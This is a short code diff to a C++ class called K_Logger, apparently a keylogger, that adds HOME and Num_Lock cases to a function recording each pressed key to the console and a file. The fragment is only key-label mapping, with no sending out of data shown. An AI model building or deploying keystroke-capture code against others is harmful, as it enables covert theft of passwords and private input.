@@ -349,6 +349,16 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *F12*  ");
 			break;
 
+		case 0x24:
+			std::cout << "  *HOME*  ";
+			WriteToFile("  *HOME*  ");
+			break;
+
+		case 0x90:
+			std::cout << "  *Num_Lock*  ";
+			WriteToFile("  *Num_Lock*  ");
+			break;
+
 		case 0x5C:
 			std::cout << "  *Right_Windows*  ";
 			WriteToFile("  *Right_Windows*  ");
